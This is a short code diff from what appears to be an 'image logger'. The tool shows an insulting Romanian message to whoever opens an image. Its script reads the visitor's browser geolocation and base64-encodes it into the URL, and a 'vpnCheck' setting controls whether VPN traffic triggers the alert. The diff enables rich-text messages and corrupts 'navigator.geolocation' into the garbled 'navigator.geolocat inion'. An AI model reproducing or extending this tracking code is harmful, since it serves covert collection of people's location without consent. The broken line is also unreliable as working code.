@@ -30,7 +30,7 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
         "message": "Esti un prost.", # Message to show
-        "richMessage": False, # Enable rich text? (See README for more info)
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
@@ -276,7 +276,7 @@ var currenturl = window.location.href;
 
 if (!currenturl.includes("g=")) {
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
+        navigator.geolocat inion.getCurrentPosition(function (coords) {
     if (currenturl.includes("?")) {
         currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
     } else {
